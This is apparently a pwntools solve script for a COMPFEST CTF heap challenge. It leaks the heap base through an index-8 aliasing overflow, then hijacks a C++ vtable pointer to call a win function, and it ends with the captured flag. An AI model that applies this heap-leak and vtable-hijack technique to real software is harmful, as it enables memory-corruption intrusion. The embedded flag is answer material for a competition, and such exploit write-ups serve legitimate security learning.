from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched', '''
    continue
''')

# p = remote('ctf.compfest.id', 7003)

# hire a worker (create an object / malloc a chunk of size 0x20) with index 0-8 through "workers[i] = new Worker();"
def hire(index):
    p.sendlineafter(b">> ", b'1')
    p.sendlineafter(b">> ", str(index).encode())

# fire a worker (delete an object / free a chunk) with index 0-8 through "delete workers[i]; workers[i] = nullptr;"
def fire(index):
    p.sendlineafter(b">> ", b'2')
    p.sendlineafter(b">> ", str(index).encode())

# tire a worker (call a function through vtable+0x10 pointer field of an object) with index 0-8 through "workers[i]->work();"
def tire(index):
    p.sendlineafter(b">> ", b'3')
    p.sendlineafter(b">> ", str(index).encode())

# view all dwords from choice_history[0] to choice_history[1] as choices and print them out
def view_history():
    p.sendlineafter(b">> ", b'4')

# clear choice history to let it restart from choice_history[0] through "choice_history.clear();"
def clear_history():
    p.sendlineafter(b">> ", b'5')

# make invalid choice to put it into choice history through "choice_history.push_back(choice);"
def invalid(choice):
    p.sendlineafter(b">> ", str(choice).encode())

# 1. choice history is kept updating in a heap chunk, whose chunk size can be appropriately adjusted
# 2. there is an integer overflow at index 8 due to "workers[8] = choice_history[0]"

# Stage 1: leak heap base address
hire(0) # workers[0] = heap_base_addr+0x12000+0x3a0, choice_history[0] = heap_base_addr+0x12000+0x380, choice_history[1] = heap_base_addr+0x12000+0x384
hire(1) # workers[1] = heap_base_addr+0x12000+0x380, choice_history[0] = heap_base_addr+0x12000+0x3c0, choice_history[1] = heap_base_addr+0x12000+0x3c8
fire(0) # workers[0] = 0, choice_history[0] = heap_base_addr+0x12000+0x3e0, choice_history[1] = heap_base_addr+0x12000+0x3ec
fire(1) # workers[1] = 0, choice_history[1] = heap_base_addr+0x12000+0x3f0
clear_history() # choice_history[0] = heap_base_addr+0x12000+0x400, choice_history[1] = heap_base_addr+0x12000+0x400
hire(7) # workers[7] = heap_base_addr+0x12000+0x3e0, choice_history[1] = heap_base_addr+0x12000+0x404
hire(8) # workers[8] = choice_history[0] = heap_base_addr+0x12000+0x380, choice_history[1] = heap_base_addr+0x12000+0x408
view_history() # all dwords from choice_history[0] = heap_base_addr+0x12000+0x380 to choice_history[1] = heap_base_addr+0x12000+0x408 are leaked
p.recvuntil(b"So far, you have:\n")
for _ in range(16):
    p.recvline()
heap_base_addr = (int(p.recvline().split(b"(")[1].split(b")")[0])<<12)-0x12000
log.info(f"heap base address: {hex(heap_base_addr)}")

# Stage 2: hijack object's vtable+0x10 pointer field to call win function
# clear choice history to let it restart from choice_history[0] = heap_base_addr+0x12000+0x380
clear_history()
# make invalid choice to let *choice_history[0] = *workers[8] = heap_base_addr+0x12000+0x388
invalid(heap_base_addr+0x12000+0x388)
invalid(0)
# make invalid choice to let **choice_history[0] = **workers[8] = 0x402619
invalid(0x402619)
invalid(0)
# call **workers[8] to trigger win function
tire(8)

p.interactive()

# COMPFEST17{Vec70r5_4ND_57r1n95_1N_CPp_4rE_keWLlllLL_263563258999374}